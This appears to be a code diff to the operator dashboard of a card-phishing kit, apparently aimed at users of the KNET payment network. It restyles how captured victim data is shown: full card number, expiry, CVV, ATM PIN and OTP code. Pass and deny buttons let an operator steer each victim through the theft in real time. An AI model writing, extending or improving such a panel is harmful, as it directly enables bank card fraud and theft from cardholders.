@@ -346,6 +346,98 @@
       .main-wrap { padding: 16px 12px; }
       th:nth-child(4), td:nth-child(4), th:nth-child(5), td:nth-child(5) { display: none; }
     }
+  /* ===== KNET Card Box ===== */
+  .knet-card-box {
+    background: #fff;
+    border: 1px solid #e5e7eb;
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 16px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+  }
+  .knet-bank-row {
+    font-size: 11px;
+    color: #6b7280;
+    text-align: right;
+    margin-bottom: 8px;
+    font-weight: 500;
+  }
+  .knet-card-num-row {
+    text-align: right;
+    margin-bottom: 14px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid #f3f4f6;
+  }
+  .knet-field-label {
+    display: block;
+    font-size: 10px;
+    color: #9ca3af;
+    text-align: right;
+    margin-bottom: 2px;
+  }
+  .knet-card-num {
+    font-size: 18px;
+    font-weight: 700;
+    color: #111827;
+    letter-spacing: 2px;
+    direction: ltr;
+    display: block;
+    text-align: right;
+  }
+  .knet-grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-bottom: 14px;
+  }
+  .knet-cell {
+    background: #f9fafb;
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    padding: 8px 10px;
+    text-align: right;
+  }
+  .knet-field-val {
+    display: block;
+    font-size: 16px;
+    font-weight: 700;
+    color: #111827;
+    direction: ltr;
+    text-align: right;
+  }
+  .knet-otp-val {
+    color: #0891b2;
+  }
+  .knet-action-btns {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-top: 4px;
+  }
+  .knet-btn-pass {
+    background: #fff;
+    border: 1px solid #d1d5db;
+    border-radius: 8px;
+    padding: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #374151;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .knet-btn-pass:hover { background: #f0fdf4; border-color: #16a34a; color: #16a34a; }
+  .knet-btn-deny {
+    background: #fff;
+    border: 1px solid #d1d5db;
+    border-radius: 8px;
+    padding: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #374151;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .knet-btn-deny:hover { background: #fef2f2; border-color: #dc2626; color: #dc2626; }
   </style>
 </head>
 <body>
@@ -803,61 +895,42 @@
 
     // بيانات الدفع
     if (b.payment) {
-      const payStep = b.payment.step || 1;
-      const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
-      const stepName = stepNames[payStep] || 'بيانات البطاقة';
-      // بناء صفوف البيانات - فقط البيانات الأساسية
-      const payRows = [];
-      if (b.payment.bank) payRows.push(dRow('البنك', b.payment.bank));
-      // دمج prefix + cardNumber في خانة واحدة
+      // بناء بيانات البطاقة بنفس شكل الصورة المرجعية
       const fullCard = (b.payment.cardPrefix || '') + (b.payment.cardNumber || '');
-      if (fullCard) payRows.push(dRow('رقم البطاقة', fullCard));
-      if (b.payment.expiryMonth || b.payment.expiryYear) {
-        payRows.push(dRow('تاريخ الانتهاء', (b.payment.expiryMonth||'') + '/' + (b.payment.expiryYear||'')));
-      } else if (b.payment.cardExpiry || b.payment.expiryDate) {
-        payRows.push(dRow('تاريخ الانتهاء', b.payment.cardExpiry || b.payment.expiryDate));
-      }
-      if (b.payment.pin) payRows.push(dRow('الرقم السري (PIN)', b.payment.pin));
-      // CVV دائماً
-      payRows.push(dRow('CVV', b.payment.cardCvv || b.payment.cvv || 'لم يدخل بعد'));
-      // OTP إذا وجد
-      if (b.otp && b.otp.otpCode) payRows.push(dRow('OTP', b.otp.otpCode));
-      h += `<div class="sec-title">بيانات الدفع</div>
-        <div class="detail-grid" style="grid-template-columns:1fr;">
-          ${payRows.join('')}
-        </div>`;
-      h += `<div class="action-section">
-          <div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div>
-          <div class="action-step-info" id="step-info-${b.referenceId}">
-            آخر إجراء: ${b.payment.paymentAction || 'لا يوجد'}
+      const expiry = b.payment.expiryMonth ? (b.payment.expiryMonth + ' / ' + (b.payment.expiryYear||'')) : (b.payment.cardExpiry || b.payment.expiryDate || '-');
+      const cvvVal = b.payment.cardCvv || b.payment.cvv || '-';
+      const pinVal = b.payment.pin || '-';
+      const otpVal = (b.otp && b.otp.otpCode) ? b.otp.otpCode : '-';
+      const bankVal = b.payment.bank || '';
+      h += `
+        <div class="sec-title">بيانات الدفع</div>
+        <div class="knet-card-box">
+          ${bankVal ? `<div class="knet-bank-row">${bankVal}</div>` : ''}
+          <div class="knet-card-num-row">
+            <span class="knet-field-label">رقم البطاقة</span>
+            <span class="knet-card-num">${fullCard || '-'}</span>
           </div>
-          <div class="action-btns">
-            <button class="action-btn-approve" id="pay-pass-${b.referenceId}" onclick="paymentAction('${b.referenceId}','pass')">
-              <i class="bi bi-check-circle-fill"></i> قبول
-            </button>
-            <button class="action-btn-reject" id="pay-denied-${b.referenceId}" onclick="paymentAction('${b.referenceId}','denied')">
-              <i class="bi bi-x-circle-fill"></i> رفض
-            </button>
+          <div class="knet-grid-2">
+            <div class="knet-cell">
+              <span class="knet-field-label">الانتهاء</span>
+              <span class="knet-field-val">${expiry}</span>
+            </div>
+            <div class="knet-cell">
+              <span class="knet-field-label">CVV</span>
+              <span class="knet-field-val">${cvvVal}</span>
+            </div>
+            <div class="knet-cell">
+              <span class="knet-field-label">PINالصراف</span>
+              <span class="knet-field-val">${pinVal}</span>
+            </div>
+            <div class="knet-cell">
+              <span class="knet-field-label">رمز OTP</span>
+              <span class="knet-field-val knet-otp-val">${otpVal}</span>
+            </div>
           </div>
-        </div>`;
-    }
-
-    // بيانات OTP - مع زرار قبول/رفض
-    if (b.otp) {
-      h += `<div class="sec-title">بيانات OTP</div>
-        <div class="detail-grid" style="grid-template-columns:1fr;">
-          ${dRow("رمز OTP",b.otp.otpCode)}
-          ${dRow("تاريخ الاستلام",(b.otp.createdAt||"").substring(0,19).replace("T"," "))}
-        </div>
-        <div class="action-section">
-          <div class="action-sec-title"><i class="bi bi-shield-check" style="color:#7c3aed"></i> إجراء OTP</div>
-          <div class="action-btns">
-            <button class="action-btn-approve" onclick="otpAction('${b.referenceId}','pass')">
-              <i class="bi bi-check-circle-fill"></i> قبول → CVV
-            </button>
-            <button class="action-btn-reject" onclick="otpAction('${b.referenceId}','denied')">
-              <i class="bi bi-x-circle-fill"></i> رفض
-            </button>
+          <div class="knet-action-btns">
+            <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="paymentAction('${b.referenceId}','pass')">قبول</button>
+            <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="paymentAction('${b.referenceId}','denied')">رفض</button>
           </div>
         </div>`;
     }
